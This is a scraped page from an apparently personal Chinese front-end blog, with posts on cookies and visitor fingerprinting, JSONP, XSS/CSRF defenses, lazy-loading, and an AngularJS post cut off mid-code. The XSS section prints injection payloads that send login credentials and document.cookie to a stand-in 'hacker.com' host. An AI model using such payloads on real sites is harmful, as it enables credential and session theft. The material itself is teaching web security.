<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/jsonp.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/js/jsonp.html" itemprop="url">
                  关于jsonp
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:57:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">js:</span><br><span class="line">function callbackFunction(result,methodName)&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">dataType:&apos;jsonp&apos;,</span><br><span class="line">data:&apos;id=10&apos;,</span><br><span class="line">jsonp:&apos;jsonp_callback&apos;,</span><br><span class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">//dostuff</span><br><span class="line">&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.get(</span><br><span class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</span><br><span class="line">&#123;</span><br><span class="line">	param: data,  //参数</span><br><span class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</span><br><span class="line">  &apos;jsonp&apos;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</span><br><span class="line">function(data)&#123; //回调函数</span><br><span class="line">//dosomething</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/safe/XSSCSRF.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/safe/XSSCSRF.html" itemprop="url">
                  XSS 与 CSRF
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:56:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</span><br><span class="line">//但如果在访问的同时注入攻击代码，如下</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</span><br><span class="line">//页面代码就会变成</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</span><br><span class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</span><br><span class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</span><br><span class="line"></span><br><span class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</span><br><span class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</span><br><span class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&apos;&gt;&apos;);</span><br><span class="line">//本次代码注入的方式变为访问</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</span><br><span class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</span><br><span class="line"></span><br><span class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</span><br><span class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</span><br><span class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</span><br></pre></td></tr></table></figure></p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;<br>使用x-xss-protection报头<br>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">相关链接</a></p>
<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数<br>3.使用strict-transport-security报头</p>
<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><p>前端提交的数据未经校验处理直接存到数据库，然后从数据库中读取直接插入到页面中<br>1.如果提交的数据本来含有可解析的代码，从数据库读取后在插入过程中可造成XSS攻击<br>2.如果提交的数据含有SQL查询语句，且被直接拼接到SQL语句中被执行，可能会导致执行结果与预期不同的现象</p>
<h2 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h2><p>对前端提交的数据进行严格校验</p>
<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><p>表现就是DNS服务器上解析表被篡改，导致将正常访问的域名指向篡改后的域名</p>
<h1 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h1><p>数据包被修改或插入，导致页面出现弹窗广告<br>解决办法就是使用HTTPS<br>使用upgrade-insecure-request报头请求升级HTTPS<br>使用content-security-policy报头响应升级HTTPS</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/lazyload.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/lazyload.html" itemprop="url">
                  懒加载
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:55:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function lazyload() &#123;</span><br><span class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</span><br><span class="line">              const len = images.length</span><br><span class="line">              let n = 0</span><br><span class="line">              return function() &#123;</span><br><span class="line">                  console.log(1)</span><br><span class="line">                  const seeHeight = document.documentElement.clientHeight</span><br><span class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</span><br><span class="line">                  for (let i = n; i &lt; len; i++) &#123;</span><br><span class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</span><br><span class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</span><br><span class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</span><br><span class="line">                          &#125;</span><br><span class="line">                          n = n + 1</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          var loadImages = lazyload()</span><br><span class="line">          window.onload = function () &#123;</span><br><span class="line">              loadImages()</span><br><span class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure></p>
<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
<p>改进方式一：使用节流阀（Throttle）</p>
<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay, atleast) &#123;</span><br><span class="line">                let timeout = null</span><br><span class="line">                let startTime = new Date()</span><br><span class="line">                return function() &#123;</span><br><span class="line">                    const curTime = new Date()</span><br><span class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</span><br><span class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</span><br><span class="line">                        fn()</span><br><span class="line">                        startTime = curTime</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">var loadImages = lazyload()</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    loadImages()</span><br><span class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改进方式二：使用防抖动技术(debounce)</p>
<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function debounced(fn,delay) &#123;</span><br><span class="line">  clearTimeout(timeoutID);  // reset timer</span><br><span class="line">  timeoutID = setTimeout(function() &#123;</span><br><span class="line">    // wait for some time</span><br><span class="line">    // and check if event happens again</span><br><span class="line">    fn()</span><br><span class="line">  &#125;, delay);</span><br><span class="line">&#125;;</span><br><span class="line">var loadImages = lazyload()</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    loadImages()</span><br><span class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="noopener">base64 编码</a></p>
<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="优化占位图"><a href="#优化占位图" class="headerlink" title="优化占位图"></a>优化占位图</h2><p>VG元素/提取图片背景色以base64形式直出<br>使用SVG画图形轮廓,再加一个模糊滤镜<br>对图片进行二值化提取剪影</p>
<h2 id="浏览器渲染图片原理"><a href="#浏览器渲染图片原理" class="headerlink" title="浏览器渲染图片原理"></a>浏览器渲染图片原理</h2><p>构建DOM树，遇到img标签加载图片<br>构建样式树，遇到backgroud-img图片不加载<br>构建render树,所有属性都会构建，如果元素有display:none属性,则其子元素不被构建<br>渲染DOM树,仅渲染没有display:none属性的元素，如果发现元素有该属性则不进行渲染;没有被构建的子元素背景图片不会被加载更不会被加载</p>
<p>设置了display:none属性的元素，图片不会渲染出来，但会加载，不管是直接的img属性还是div的背景图片都会被加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</span><br><span class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//加载</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">  .skslsl&#123;</span><br><span class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>设置了display:none属性元素的子元素，样式表中的背景图片不会渲染出来，也不会加载；而img标签的图片不会渲染出来，但会加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;display: none;&quot;&gt;</span><br><span class="line">  &lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</span><br><span class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//不加载</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">  .skslsl&#123;</span><br><span class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<p>当触发伪类的时候，伪类样式上的背景图片才会加载。</p>
<p>重复图片只加载一次，是因为加载一次后，之后的加载均从缓存中读取;<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552419&amp;idx=2&amp;sn=f799d2d6e4dabe9a9f4c6658a666bcc5&amp;chksm=8025ad62b75224741cc211dc5cd9c0ee8ecef618eb2c35c0caee307465d60e31b7dfd50e08d0&amp;mpshare=1&amp;scene=1&amp;srcid=0115Kms4rvGLhJLnX7FPpZXq&amp;pass_ticket=tyJD73rZ13FVCnO01hd9fVJmLQcKjapRW2yB41zZMwumTsYvs1XDVW5%2BSiBX50%2Bk#rd" target="_blank" rel="noopener">链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/angular/angularissue.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/angular/angularissue.html" itemprop="url">
                  AngularJS issue
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-31T16:33:15+08:00">
                2017-10-31
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#$digest和$apply</p>
<p>当调用$digest的时候，只触发当前作用域和它的子作用域上的监控，但是当调用$apply的时候，会触发作用域树上的所有监控。</p>
<p>因此，从性能上讲，如果能确定自己作的这个数据变更所造成的影响范围，应当尽量调用$digest，只有当无法精确知道数据变更造成的影响范围时，才去用$apply，很暴力地遍历整个作用域树，调用其中所有的监控。</p>
<h1 id="视图模型的层次"><a href="#视图模型的层次" class="headerlink" title="视图模型的层次"></a>视图模型的层次</h1><p>在Angular中，存在作用域的继承。所谓作用域的继承，是指：如果两个视图有包含关系，内层视图对应的作用域可以共享外层视图作用域的数据。<br>以下情况会造成嵌套作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// 1. controller 套嵌</span><br><span class="line">如果两个控制器所对应的视图存在上下级关系，它们的作用域就自动产生继承关系</span><br><span class="line">html:</span><br><span class="line">&lt;body ng-app=&quot;test&quot;&gt;</span><br><span class="line">    &lt;div ng-controller=&quot;OuterCtrl&quot;&gt;//父域</span><br><span class="line">        &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</span><br><span class="line">        &lt;div ng-controller=&quot;InnerCtrl&quot;&gt;//子域</span><br><span class="line">            &lt;span 